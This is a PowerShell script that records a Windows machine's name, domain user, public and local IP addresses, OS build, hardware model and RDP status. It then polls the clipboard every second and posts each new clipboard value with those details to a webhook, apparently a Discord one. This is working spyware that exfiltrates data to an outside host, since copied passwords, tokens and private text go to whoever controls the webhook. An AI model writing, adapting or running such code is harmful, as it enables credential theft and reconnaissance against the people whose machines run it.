[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$pcName     = $env:COMPUTERNAME
$userName   = $env:USERNAME
$userDomain = $env:USERDOMAIN
$fullUser   = "$userDomain\$userName"

# External/public IP
try {
    $externalIp = Invoke-RestMethod -Uri "https://ipinfo.io/ip" -UseBasicParsing
} catch {
    $externalIp = "Unknown"
}

# OS version + build
$os = Get-CimInstance Win32_OperatingSystem
$osCaption = $os.Caption
$osVersion = $os.Version

# Make and model
$cs = Get-CimInstance Win32_ComputerSystem
$manufacturer = $cs.Manufacturer
$model        = $cs.Model

# Local IPv4 (active interface)
try {
    $localIp = (Get-NetIPConfiguration | Where-Object {
        $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"
    }).IPv4Address.IPAddress
    if (-not $localIp) { $localIp = "Unknown" }
} catch {
    $localIp = "Unknown"
}

# RDP enabled (based on fDenyTSConnections = 0 => enabled)[web:115][web:116][web:119]
try {
    $denyValue = (Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server').fDenyTSConnections
    if ($denyValue -eq 0) {
        $rdpStatus = "Enabled"
    } else {
        $rdpStatus = "Disabled"
    }
} catch {
    $rdpStatus = "Unknown"
}

$lastClipboard = $null

Write-Host "Monitoring clipboard. Press Ctrl+C to stop."

while ($true) {
    $clipboard = Get-Clipboard -Raw -ErrorAction SilentlyContinue

    if ($clipboard -and $clipboard -ne $lastClipboard) {
        $message = @"
------
**PC Name:** $pcName
**Username:** $fullUser
**External IP:** $externalIp
**Local IP:** $localIp
**OS:** $osCaption ($osVersion)
**Hardware:** $manufacturer $model
**RDP:** $rdpStatus
**Clipboard Message:** $clipboard
"@

        $payload = @{
            content  = $message
            username = "Clipboard Bot"
        }

        $payloadJson = $payload | ConvertTo-Json

        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payloadJson -ContentType 'application/json'
            Write-Host "Sent updated clipboard at $(Get-Date)."
            $lastClipboard = $clipboard
        } catch {
            Write-Warning "Failed to send to Discord: $_"
        }
    }

    Start-Sleep -Seconds 1
}


